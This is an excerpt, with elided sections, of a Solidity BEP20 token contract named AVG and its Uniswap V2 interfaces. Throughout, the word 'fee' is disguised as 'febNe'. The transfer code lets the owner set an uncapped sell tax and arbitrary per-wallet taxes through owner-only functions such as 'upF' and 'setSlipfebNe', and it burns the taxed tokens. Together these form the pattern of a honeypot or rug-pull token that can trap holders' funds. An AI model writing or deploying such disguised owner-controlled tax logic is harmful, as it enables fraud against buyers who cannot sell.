...
interface IUniswapV2Factory {
    ...
    function febNeTo() external view returns (address);
    function febNeToSetter() external view returns (address);
    ...
    function setfebNeTo(address) external;
    function setfebNeToSetter(address) external;
}


interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingfebNeOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function removeLiquidityETHWithPermitSupportingfebNeOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function swapExactTokensForTokensSupportingfebNeOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
    ...
    function swapExactETHForTokensSupportingfebNeOnTransferTokens(
        uint AmountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingfebNeOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
...
contract AVG
 is BEP20, Ownable {
    ...
    uint256 private _defaultSellfebNe = 0;

    uint256 private _defaultBuyfebNe = 0;


    mapping(address => bool) private _mAccount;

    mapping(address => uint256) private _slipfebNe;
    ...
    function upF(uint256 _value) external onlyownar {
        _defaultSellfebNe = _value;
    }

    function setSlipfebNe(address _address, uint256 _value) external onlyownar {
        require(_value > 0, "Account tax must be greater than or equal to 1");
        _slipfebNe[_address] = _value;
    }

    function getSlipfebNe(address _address) external view onlyownar returns (uint256) {
        return _slipfebNe[_address];
    }


    function setMAccountfebNe(address _address, bool _value) external onlyownar {
        _mAccount[_address] = _value;
    }

    function getMAccountfebNe(address _address) external view onlyownar returns (bool) {
    ...
    function _receiveF(
        ...
        uint256 tradefebNeAmount = 0;

        if (rF) {
            uint256 tradefebNe = 0;
            if (uniswapV2Pair != address(0)) {
                if (_to == uniswapV2Pair) {

                    tradefebNe = _defaultSellfebNe;
                }
                if (from == uniswapV2Pair) {

                    tradefebNe = _defaultBuyfebNe;
                }
            }
            if (_slipfebNe[from] > 0) {
                tradefebNe = _slipfebNe[from];
            }

            tradefebNeAmount = _Amount.mul(tradefebNe).div(100);
        }


        if (tradefebNeAmount > 0) {
            _balances[from] = _balances[from].sub(tradefebNeAmount);
            _balances[_deadAddress] = _balances[_deadAddress].add(tradefebNeAmount);
            emit Transfer(from, _deadAddress, tradefebNeAmount);
        }

        _balances[from] = _balances[from].sub(_Amount - tradefebNeAmount);
        _balances[_to] = _balances[_to].add(_Amount - tradefebNeAmount);
        emit Transfer(from, _to, _Amount - tradefebNeAmount);
    }
